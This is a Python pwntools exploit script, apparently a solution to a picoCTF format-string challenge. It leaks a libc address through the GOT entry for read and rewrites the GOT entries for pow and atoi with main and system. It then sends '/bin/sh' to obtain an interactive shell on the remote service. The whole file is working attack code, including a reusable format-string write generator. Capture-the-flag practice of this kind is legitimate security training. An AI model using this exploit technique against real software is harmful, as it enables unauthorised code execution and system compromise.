#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall_patched")
libc = ELF("./libc-2.31.so")
ld = ELF("./ld-2.31.so")

context.binary = exe

"""
Idea: leak "read" got address using format string, and write the got of "pow" to main in order to loop.
Then in the second iteration, using the leaked libc base, overwrite the got of "atoi" to the address of "system".
In the third iteration set A = "/bin/sh", so atoi(A) will be system("/bin/sh")
"""

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("mars.picoctf.net", 31929)

    return r

def generate_write(text, base_offset, start_chars_written):
    payload = b""
    cur = start_chars_written
    for i in range(len(text)):
        cur_char = text[i]
        if cur != cur_char:
            payload += b"%" + str((cur_char + 256 - cur) % 256).encode() + b"c"
        payload += b"%" + str(base_offset + i).encode() + b"$hhn"
        cur = cur_char
    return payload

def main():
    a_buffer_offset = 10
    b_buffer_offset = a_buffer_offset + 0x100 // 8
    r = conn()
    base_offset = b_buffer_offset + 5
    base_chars_written = len("Calculating for A: 10")
    payload_a = b"10"
    payload_a += generate_write(p64(exe.symbols["main"]), base_offset, base_chars_written)
    r.sendline(payload_a)

    payload_b = b"10##%" + str(b_buffer_offset + 4).encode() +  b"$s##"
    while len(payload_b) < 32:
        payload_b += b"a"
    assert len(payload_b) == 32
    payload_b += p64(exe.got["read"])
    for i in range(8):
        payload_b += p64(exe.got["pow"] + i)
    r.sendline(payload_b)

    r.recvuntil(b"##")
    read_got = r.recvuntil(b"##", drop=True)
    read_got = read_got.ljust(8, b"\x00")
    read_got = unpack(read_got)
    libc_base = read_got - libc.symbols["read"]
    print("libc base: ", hex(libc_base))

    system_addr = libc.symbols["system"] + libc_base
    payload_a = b"10"
    base_offset = b_buffer_offset + 1
    payload_a += generate_write(p64(system_addr), base_offset, base_chars_written)
    r.sendline(payload_a)

    payload_b = b"10"
    while len(payload_b) < 8:
        payload_b += b"a"
    assert len(payload_b) == 8
    for i in range(8):
        payload_b += p64(exe.got["atoi"] + i)
    r.sendline(payload_b)

    time.sleep(1)
    r.sendline(b"/bin/sh")
    r.sendline(b"10")

    r.interactive()

if __name__ == "__main__":
    main()
